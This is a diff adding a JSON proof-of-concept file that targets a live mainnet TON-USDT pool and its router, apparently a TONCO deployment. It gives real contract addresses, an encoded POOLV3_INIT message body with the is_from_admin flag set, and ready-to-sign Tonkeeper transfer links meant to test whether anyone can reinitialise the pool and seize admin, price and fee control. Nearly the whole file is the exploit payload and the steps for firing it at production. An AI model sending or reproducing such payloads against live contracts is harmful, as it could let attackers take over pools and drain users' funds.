@@ -1,0 +1,32 @@
+{
+  "purpose": "NEW-03 on-chain verification: is_from_admin flag trust without verification",
+  "network": "mainnet",
+  "routerAddress": "EQC_-t0nCnOFMdp7E7qPxAOCbCWGFz-e3pwxb6tTvFmshjt5",
+  "poolAddress": "EQD25vStEwc-h1QT1qlsYPQwqU5IiOhox5II0C_xsDNpMVo7",
+  "poolDescription": "TON-USDT pool (from report)",
+  "amountNano": "10000000",
+  "amountTon": "0.01",
+  "expectedBehavior": [
+    "1. Open the link below from your wallet and sign the transaction.",
+    "2. If the transaction SUCCEEDS (pool accepts it): NEW-03 is CONFIRMED — is_from_admin flag is trusted without sender verification.",
+    "   → This means ANYONE can reinitialize the pool, change admin, price, fees, etc.",
+    "3. If the transaction FAILS (exit code, bounce): NEW-03 is NOT confirmed — pool likely verifies msg.sender == router_address || admin_address.",
+    "4. Check the result on tonviewer.com or similar explorer."
+  ],
+  "test1_minimal": {
+    "description": "Minimal POOLV3_INIT with is_from_admin=1, no admin override. Tests if pool accepts the message at all.",
+    "bodyBoc": "te6cckEBAgEAMAACU0QcOe0AAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4iTiJOIwEBAACQfsgj",
+    "link": "https://app.tonkeeper.com/transfer/EQD25vStEwc-h1QT1qlsYPQwqU5IiOhox5II0C_xsDNpMVo7?amount=10000000&bin=te6cckEBAgEAMAACU0QcOe0AAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4iTiJOIwEBAACQfsgj"
+  },
+  "test2_router": {
+    "description": "Same message sent to ROUTER instead of POOL. Maybe router forwards init to pool.",
+    "bodyBoc": "te6cckEBAgEAMAACU0QcOe0AAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4iTiJOIwEBAACQfsgj",
+    "link": "https://app.tonkeeper.com/transfer/EQC_-t0nCnOFMdp7E7qPxAOCbCWGFz-e3pwxb6tTvFmshjt5?amount=10000000&bin=te6cckEBAgEAMAACU0QcOe0AAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4iTiJOIwEBAACQfsgj"
+  },
+  "notes": [
+    "The body contains: op=0x441c39ed (POOLV3_INIT), query_id=0, is_from_admin=1, all other fields set to defaults/unchanged.",
+    "If the pool accepts this message, it means the is_from_admin bit is trusted without verifying the sender.",
+    "This is the most common critical vulnerability in TON DeFi contracts (documented in multiple audits).",
+    "Beosin audit confirmed LACK of protection (TONCO-03) but didn't check if sender is verified."
+  ]
+}
